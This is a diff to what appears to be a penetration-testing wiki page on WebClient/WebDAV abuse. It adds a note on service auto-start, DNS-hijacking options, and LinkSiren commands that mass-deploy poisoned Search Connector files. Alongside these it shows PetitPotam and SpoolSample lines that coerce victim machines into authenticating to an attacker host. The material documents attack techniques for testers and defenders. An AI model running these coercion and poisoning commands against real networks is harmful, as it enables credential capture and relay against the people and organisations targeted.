@@ -16,6 +16,9 @@ The WebClient service needs to be enabled for WebDAV-based programs and features
 
 Attackers can remotely enumerate systems on which the WebClient is running, which is not uncommon in organizations that use OneDrive or SharePoint or when mounting drives with a WebDAV connection string.
 
+> [!TIP]
+> Even if the WebClient service is not currently running on a remote system, the coercion techniques in the abuse section will cause it to start if it is installed and in the state "Manual (Triggered Start)", default for Windows 10 and Windows 11. By default, the WebClient service is not installed on Windows Servers beginning with Windows Server 2008 per [WebDAVSystem](https://www.webdavsystem.com/server/access/windows). 
+
 ::: tabs
 
 === UNIX-like
@@ -50,7 +53,8 @@ The WebDAV Connection String format is: `\\SERVER@PORT\PATH\TO\DIR`.
 > 
 > In order to have a valid NetBIOS name, [Responder](https://github.com/lgandx/Responder) can be used.
 > 
-> A heftier alternative is to do some [ADIDNS poisoning](adidns-spoofing.md) to create and use a valid DNS entry.
+> A heftier alternative is to do some [ADIDNS poisoning](adidns-spoofing.md), [non-secure dynamic DNS updates, or Microsoft Dynamic DHCP 
+ DNS abuse](https://alittleinsecure.com/dns-hijacking-say-my-name/) using [DDSpoof](https://github.com/akamai/DDSpoof) to create and use a valid DNS entry.
 
 Below are a few examples of WebClient abuse with [PrinterBug](../print-spooler-service/printerbug.md) and [PetitPotam](ms-efsr.md).
 
@@ -63,6 +67,22 @@ SpoolSample.exe "VICTIM_IP" "ATTACKER_NETBIOS_NAME@PORT/print"
 Petitpotam.py "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "VICTIM_IP"
 Petitpotam.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "VICTIM_IP"
 PetitPotam.exe "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "VICTIM_IP"
+```
+
+In addition to remote system accounts, an attacker may also force authentication from a remote user account that opens a folder containing a SearchConnector using Windows Explorer from a Windows system where the WebClient service is installed.
+[LinkSiren](https://github.com/gjhami/LinkSiren) (Python) crawls and ranks accessible share locations based on the number of recently accessed files. It can then be used to deploy and cleanup poisoned Search Connector files at scale that coerce both SMB and HTTP authentication.
+
+```bash
+# Identify optimal poisoning locations from a file containing UNC paths of hosts, shares, or subfolders to crawl
+linksiren identify --targets '/path/to/base_targets.txt' 'DOMAIN'/'USERNAME':'PASSWORD'
+
+# Mass deploy poisoned Search Connectors to a list of target UNC paths to folders
+linksiren deploy --targets '/path/to/foler_targets.txt' --attacker 'ATTACKER_NETBIOS_NAME' 'DOMAIN'/'USERNAME':'PASSWORD'
+
+# Capture and relay incoming authentication
+
+# Mass cleanup all poisoned Search Connectors
+linksiren cleanup --targets '/path/to/payloads_written.txt' 'DOMAIN'/'USERNAME':'PASSWORD'
 ```
 
 ### Start the WebClient service
